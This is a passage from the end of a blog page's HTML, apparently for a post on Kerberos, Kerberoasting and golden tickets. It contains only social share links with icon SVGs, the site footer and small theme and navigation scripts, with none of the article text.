19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share kerberos, kerberoast and golden tickets on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share kerberos, kerberoast and golden tickets on whatsapp" href="https://api.whatsapp.com/send?text=kerberos%2c%20kerberoast%20and%20golden%20tickets%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share kerberos, kerberoast and golden tickets on telegram" href="https://telegram.me/share/url?text=kerberos%2c%20kerberoast%20and%20golden%20tickets&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>